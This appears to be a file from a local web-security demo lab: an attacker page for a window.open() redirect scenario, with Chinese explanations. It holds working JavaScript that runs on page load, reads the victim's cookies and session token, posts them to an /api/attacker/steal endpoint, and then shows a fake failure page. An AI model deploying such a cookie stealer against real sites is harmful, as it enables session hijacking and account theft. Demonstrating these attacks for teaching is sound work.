@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>攻击者 - Case1 window.open() 劫持</title>
+    <link rel="stylesheet" href="/styles.css" />
+    <style>
+      .attacker-header {
+        background: linear-gradient(135deg, #dc2626, #991b1b);
+        color: white;
+        padding: 1.5rem 1rem;
+        text-align: center;
+      }
+      .attacker-header h1 {
+        margin: 0;
+        font-size: 1.8rem;
+      }
+      .code-block {
+        background: #1e293b;
+        color: #e2e8f0;
+        padding: 1.5rem;
+        border-radius: 0.8rem;
+        font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+        font-size: 0.9rem;
+        line-height: 1.6;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+      .code-block .comment {
+        color: #94a3b8;
+      }
+      .code-block .string {
+        color: #86efac;
+      }
+      .code-block .keyword {
+        color: #fbbf24;
+      }
+    </style>
+  </head>
+  <body>
+    <header class="attacker-header">
+      <h1>😈 Case1 攻击：window.open() Cookie 窃取</h1>
+    </header>
+    <main class="container">
+      <section class="section">
+        <h2>🎯 攻击原理</h2>
+        <p>
+          受害者在 case1-auth.html 页面中使用 window.open() 打开第三方认证页面时，
+          如果认证 URL 参数可以被攻击者控制，攻击者可以构造一个恶意 URL，
+          将用户重定向到自己的恶意页面，从而窃取受害者的 cookie。
+        </p>
+        <p><strong>攻击流程：</strong></p>
+        <ol>
+          <li>攻击者准备一个恶意页面（当前页面），该页面会读取 document.cookie</li>
+          <li>攻击者构造恶意 URL，指向自己的恶意页面</li>
+          <li>攻击者诱导受害者在 case1-auth.html 中输入或选择这个恶意 URL</li>
+          <li>受害者点击"打开认证窗口"时，window.open() 会打开攻击者的恶意页面</li>
+          <li>恶意页面自动读取 cookie 并发送到攻击者服务器</li>
+          <li>攻击者在后台查看窃取的 cookie</li>
+        </ol>
+      </section>
+
+      <section class="section">
+        <h2>💻 攻击代码展示</h2>
+        <div class="code-block">
+<span class="comment">// 恶意页面（attacker-case1.html）的代码</span>
+<span class="comment">// 当受害者通过 window.open() 打开此页面时，自动执行以下代码</span>
+<br>
+<span class="comment">// 1. 读取当前页面的所有 cookie</span>
+<span class="keyword">const</span> cookies = <span class="string">document.cookie</span>;
+<br>
+<span class="comment">// 2. 提取 case1Token（如果存在）</span>
+<span class="keyword">const</span> case1Token = cookies
+  .split(<span class="string">'; '</span>)
+  .find(c => c.startsWith(<span class="string">'case1Token='</span>))
+  ?.split(<span class="string">'='</span>)[1];
+<br>
+<span class="comment">// 3. 将 cookie 发送到攻击者服务器</span>
+<span class="keyword">fetch</span>(<span class="string">'/api/attacker/steal'</span>, {
+  method: <span class="string">'POST'</span>,
+  headers: { <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span> },
+  body: <span class="keyword">JSON</span>.stringify({
+    caseId: <span class="string">'case1'</span>,
+    attackType: <span class="string">'window.open'</span>,
+    cookies: cookies,
+    case1Token: case1Token,
+    referer: <span class="string">document.referrer</span>,
+    userAgent: navigator.userAgent
+  })
+});
+<br>
+<span class="comment">// 4. 可选：显示虚假的认证页面，让受害者以为这是正常的认证流程</span>
+<span class="keyword">document</span>.body.innerHTML = <span class="string">'&lt;h1&gt;正在跳转...&lt;/h1&gt;'</span>;
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🔗 恶意 URL 构造</h2>
+        <p>攻击者需要构造以下 URL，让受害者在 case1-auth.html 中使用：</p>
+        <div class="code-block">
+<span class="string">http://localhost:8080/attacker-case1.html</span>
+<br>
+<span class="comment">// 或者更隐蔽的方式，伪装成正常的认证 URL：</span>
+<span class="string">http://localhost:8080/attacker-case1.html?provider=github&client_id=fake</span>
+        </div>
+        <p class="muted">
+          在 case1-auth.html 中，如果用户选择"自定义"认证提供商并输入上述 URL，
+          点击"打开认证窗口"时，window.open() 会打开此恶意页面。
+        </p>
+      </section>
+
+      <section class="section">
+        <h2>📊 攻击状态</h2>
+        <div id="attackLog" class="log-panel">等待攻击触发...</div>
+        <button onclick="checkStolenCookies('case1')" style="margin-top: 1rem;">查看窃取的 Cookie</button>
+      </section>
+    </main>
+    <script>
+      // 页面加载时自动执行攻击代码
+      (async function() {
+        const logPanel = document.getElementById('attackLog');
+        const appendLog = (msg) => {
+          const timestamp = new Date().toLocaleTimeString();
+          logPanel.textContent = `[${timestamp}] ${msg}\n${logPanel.textContent}`.slice(0, 2000);
+        };
+
+        appendLog('⚠️ 恶意页面已加载，开始窃取 Cookie...');
+
+        // 读取所有 cookie
+        const cookies = document.cookie;
+        appendLog(`读取到 Cookie: ${cookies || '(无)'}`);
+
+        // 提取 case1Token
+        const case1Token = cookies
+          .split('; ')
+          .find(c => c.startsWith('case1Token='))
+          ?.split('=')[1];
+
+        if (case1Token) {
+          appendLog(`✅ 成功提取 case1Token: ${case1Token}`);
+        } else {
+          appendLog('⚠️ 未找到 case1Token，可能受害者尚未访问 case1-auth.html');
+        }
+
+        // 发送到攻击者服务器
+        try {
+          const response = await fetch('/api/attacker/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              caseId: 'case1',
+              attackType: 'window.open',
+              cookies: cookies,
+              case1Token: case1Token,
+              referer: document.referrer,
+              userAgent: navigator.userAgent,
+              url: window.location.href
+            })
+          });
+
+          const data = await response.json();
+          if (data.success) {
+            appendLog('✅ Cookie 已成功发送到攻击者服务器！');
+          }
+        } catch (err) {
+          appendLog(`❌ 发送失败: ${err.message}`);
+        }
+
+        // 显示虚假页面
+        setTimeout(() => {
+          document.body.innerHTML = `
+            <div style="text-align: center; padding: 3rem; font-family: sans-serif;">
+              <h1>认证失败</h1>
+              <p>请返回原页面重试</p>
+            </div>
+          `;
+        }, 2000);
+      })();
+
+      async function checkStolenCookies(caseId) {
+        const logPanel = document.getElementById('attackLog');
+        try {
+          const res = await fetch('/api/attacker/stolen');
+          const data = await res.json();
+          const filtered = data.cookies.filter(c => c.caseId === caseId);
+          if (filtered.length === 0) {
+            logPanel.textContent = '暂无此 Case 的 Cookie 数据\n' + logPanel.textContent;
+          } else {
+            logPanel.textContent = `找到 ${filtered.length} 条 Cookie 记录：\n${JSON.stringify(filtered, null, 2)}\n\n` + logPanel.textContent;
+          }
+        } catch (err) {
+          logPanel.textContent = `查询失败: ${err.message}\n` + logPanel.textContent;
+        }
+      }
+    </script>
+  </body>
+</html>
+
